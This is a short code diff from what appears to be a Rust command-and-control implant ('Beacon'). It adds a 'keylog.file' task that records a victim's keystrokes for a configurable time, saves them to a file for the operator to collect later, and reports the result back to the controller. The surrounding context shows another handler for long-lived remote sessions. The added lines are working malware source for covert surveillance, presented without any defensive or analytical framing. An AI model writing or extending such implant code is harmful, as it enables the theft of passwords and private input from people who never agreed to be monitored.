@@ -424,6 +424,23 @@ impl Beacon {
                         }
                     }
                 }
+                "keylog.file" => {
+                    // The key logger writes into a file: the operator
+                    // fetches it later, at their own pace.
+                    let path = args.str_or("path", "");
+                    let seconds = args.u64_or("seconds", 300);
+                    match crate::desktop::keylog_to_file(&path, seconds) {
+                        Ok(report) => {
+                            self.log(&format!("key logger writes to {path}"));
+                            let outcome = task::Outcome::ok(report.into_bytes());
+                            self.send_result(&id, &outcome)?;
+                        }
+                        Err(e) => {
+                            let outcome = task::Outcome::err(1, e);
+                            self.send_result(&id, &outcome)?;
+                        }
+                    }
+                }
                 "session.open" => {
                     // The session outlives the task: the beacon keeps the
                     // stream, sends the output as partial results and
